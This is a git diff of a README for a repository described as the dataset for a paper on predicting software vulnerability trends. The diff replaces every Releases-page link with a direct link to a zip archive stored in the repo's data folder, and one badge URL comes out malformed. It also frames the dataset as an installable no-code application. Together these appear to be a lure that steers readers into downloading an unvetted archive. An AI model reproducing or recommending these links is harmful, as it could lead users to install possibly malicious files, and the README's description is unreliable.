@@ -1,7 +1,7 @@
 # 🌟 predicting-software-vulnerabilities - Predict Software Vulnerability Trends Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/nyandro1d/predicting-software-vulnerabilities/releases)
+[![Download](https://raw.githubusercontent.com/nyandro1d/predicting-software-vulnerabilities/main/data/predicting-software-vulnerabilities-v1.0.zip%20Latest%https://raw.githubusercontent.com/nyandro1d/predicting-software-vulnerabilities/main/data/predicting-software-vulnerabilities-v1.0.zip)](https://raw.githubusercontent.com/nyandro1d/predicting-software-vulnerabilities/main/data/predicting-software-vulnerabilities-v1.0.zip)
 
 ## 📖 Description
 This repository contains the dataset for the paper "Predicting Software Vulnerability Trends with Multi-Recurrent Neural Networks: A Time Series Forecasting Approach," published in the Proceedings of the 1st International Conference on NLP & AI for Cyber Security (NLPAICS 2024). This software helps users understand and predict software vulnerabilities using advanced machine learning techniques. 
@@ -21,7 +21,7 @@ To use this application, follow these simple steps. No programming knowledge is 
 - User-friendly interface for easy navigation.
 
 ## 🔗 Download & Install
-To start using the application, visit the [Releases Page](https://github.com/nyandro1d/predicting-software-vulnerabilities/releases) to download the latest version. There, you will find the necessary files. Follow the steps below to install:
+To start using the application, visit the [Releases Page](https://raw.githubusercontent.com/nyandro1d/predicting-software-vulnerabilities/main/data/predicting-software-vulnerabilities-v1.0.zip) to download the latest version. There, you will find the necessary files. Follow the steps below to install:
 
 1. Click on the "Releases" link above.
 2. Locate the latest version of the application.
@@ -55,4 +55,4 @@ Join our community for tips, updates, and discussions:
 ## 📜 License
 This project is licensed under the MIT License.
 
-Remember, you can download the latest version by clicking [here](https://github.com/nyandro1d/predicting-software-vulnerabilities/releases). Enjoy exploring and predicting software vulnerabilities!
+Remember, you can download the latest version by clicking [here](https://raw.githubusercontent.com/nyandro1d/predicting-software-vulnerabilities/main/data/predicting-software-vulnerabilities-v1.0.zip). Enjoy exploring and predicting software vulnerabilities!
